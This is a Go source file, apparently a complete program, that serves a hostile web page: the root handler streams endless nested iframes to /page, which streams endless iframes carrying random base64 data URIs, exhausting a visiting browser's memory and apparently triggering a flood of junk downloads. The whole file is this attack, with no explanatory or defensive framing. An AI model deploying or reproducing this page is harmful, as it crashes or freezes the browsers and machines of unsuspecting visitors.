package main

import (
	"math/rand"
	"net/http"
	"encoding/base64"
)

func main() {
	http.HandleFunc("/page", page)
	http.HandleFunc("/", flood)
	http.ListenAndServe(":8080", nil)
}

func flood(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	flusher, ok := w.(http.Flusher)
	if !ok {
		return
	}
	head := []byte("<iframe src=\"/page\"></iframe>")
	for {
		for i := 0; i < 100; i++ {
			_, err := w.Write(head)
			if err != nil {
				return
			}
		}
		flusher.Flush()
	}
}

func page(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	flusher, ok := w.(http.Flusher)
	if !ok {
		return
	}
	data := make([]byte, 16)
	head := []byte("<iframe src=\"data:application/octet-stream;base64,")
	foot := []byte("\"></iframe>")
	for {
		for i := 0; i < 100; i++ {
			_, err := w.Write(head)
			if err != nil {
				return
			}
			rand.Read(data)
			encoder := base64.NewEncoder(base64.StdEncoding, w)
			_, err = encoder.Write(data)
			if err != nil {
				return
			}
			encoder.Close()
			_, err = w.Write(foot)
			if err != nil {
				return
			}
		}
		flusher.Flush()
	}
}
